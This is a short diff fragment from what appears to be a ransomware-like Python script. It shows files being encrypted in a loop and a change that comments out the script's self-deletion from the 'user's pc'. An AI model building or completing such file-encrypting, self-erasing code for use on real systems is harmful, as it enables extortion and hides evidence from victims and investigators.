@@ -34,4 +34,4 @@ for file in files:
         encryption_file.write(encrypted_contents)
 
 # delete encryption script from user's pc
-os.remove(argv[0])
+# os.remove(argv[0])
